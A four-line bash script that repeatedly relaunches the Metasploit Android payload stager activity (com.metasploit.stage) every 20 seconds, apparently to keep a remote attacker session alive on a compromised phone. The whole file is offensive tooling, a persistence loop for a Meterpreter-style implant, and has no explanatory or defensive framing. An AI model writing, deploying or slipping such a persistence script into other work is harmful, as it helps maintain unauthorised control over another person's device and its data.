#!/bin/bash

while true; do
    am start -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity
    sleep 20
done
